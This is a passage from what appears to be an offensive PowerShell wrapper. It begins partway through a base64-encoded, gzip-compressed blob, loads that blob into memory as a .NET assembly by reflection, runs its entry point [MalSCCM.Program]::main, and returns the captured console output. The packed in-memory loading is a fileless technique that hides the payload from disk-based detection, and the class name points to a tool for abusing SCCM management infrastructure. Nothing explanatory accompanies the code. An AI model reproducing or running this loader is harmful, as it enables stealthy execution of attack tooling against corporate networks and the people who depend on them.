jIP5lgem6NVC8PhVI0w96g/p/wvIpHWQc51nSbbglpB8cXsnykEcw9sEdvxqVuhnuX7np1Hrt4t+plv0VuZEWX+6lD7BvtZ37X2vSS/wfcfmhfioQ33kuXRz6ONwUXlrJ7qqx3SHQ+ThE/FeFGRyHAfL/50GBsjh8lBfsDv4hBvqB5c0sC4eOmBEKJMRye9aWGsA+5nXEopeyeJVjzSzIs5CNuNF9kh8byrnk7pXltgL4Xonmy5PaiBswxc2vaQ4MF2r36PcBfqwo8c++8MXuvRen0/Hz4qcF9zSiK2yM65lkdjKVObOn8dj4YPOuxjj9buRkIp3N6HsaL+lm496eyrLKsu6E9Xt/cSSRMfc0zhqZLjM5pU8nzOZp+UOgzcnsdFfCnG45394Yn05kUqd1M3dc7Q+JxeM2saFJPZNL5S65eKJ3YzyTmEYGhi8pv7TVkpiZaWwVFHLGrJmjH4ErkZ8O0TO2NPXkrIF9WjCWGPq5WeRTnzxipM6n0voZ3SyRamejTUWlI37gEDk+pJ/X0/E0pXsaE6b4uTSjMT6b6uUfOtvTeDqRNnVrUEyktQA3kvVWF+/drbYQEO5ulULtgRfv9SX0ufj1jvYXsc////qNef0/1Me2LACsAAA="))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [MalSCCM.Program]::main([string[]]$args)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}
